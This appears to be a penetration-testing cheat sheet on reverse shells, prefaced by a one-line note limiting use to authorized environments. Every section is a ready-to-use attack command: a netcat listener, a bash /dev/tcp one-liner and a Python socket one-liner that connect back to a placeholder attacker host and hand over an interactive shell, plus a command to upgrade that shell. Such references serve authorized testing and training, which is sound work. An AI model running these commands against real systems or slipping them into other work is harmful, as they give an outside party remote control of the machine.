# Reverse Shells

Use only in an authorized environment.

## Listener

```bash
nc -lvnp <LPORT>
```

## Bash

```bash
/bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
```

## Python

```bash
python3 -c 'import pty; import socket, os; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("<LHOST>", <LPORT>)); [os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]; pty.spawn("/bin/bash")'
```

## Stabilize an existing shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
